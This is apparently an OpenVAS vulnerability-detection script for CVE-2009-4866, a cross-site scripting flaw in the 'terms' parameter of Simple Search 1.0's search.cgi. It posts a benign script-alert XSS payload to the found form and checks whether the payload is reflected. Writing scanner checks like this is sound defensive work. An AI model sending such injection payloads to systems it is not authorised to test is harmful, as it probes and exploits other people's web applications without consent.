if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801212" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2009-4866" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-05-25 13:56:16 +0200 (Tue, 25 May 2010)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "Simple Search 'terms' Cross-Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/52311" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/36178" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/0908-exploits/simplesearch-xss.txt" );
	script_tag( name: "impact", value: "Successful exploitation will allow an attacker to execute arbitrary
  code in the context of the application." );
	script_tag( name: "affected", value: "Simple Search version 1.0. Other versions may also be affected." );
	script_tag( name: "insight", value: "The flaw is caused by an improper validation of user-supplied
  input passed via the 'terms' parameter to 'search.cgi', that allows attackers
  to execute arbitrary HTML and script code on the web server." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Simple Search whci is prone to a cross-site
  scripting vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/search", "/", http_cgi_dirs( port: port ) ) {
	install = dir;
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/search.html", port: port );
	if(ContainsString( res, ">Matt's Script Archive<" )){
		action = eregmatch( pattern: NASLString( "action=\"(.*cgi)\">" ), string: res );
		if(action[1]){
			url = dir + "/" + action[1];
			req = http_post( port: port, item: url, data: "terms=%3Cscript%3Ealert%28%22VT-Test%22%29%3C%2Fscript%3E&boolean=AND&case=Insensitive" );
			res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
			if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<script>alert(\"VT-Test\")</script>" )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

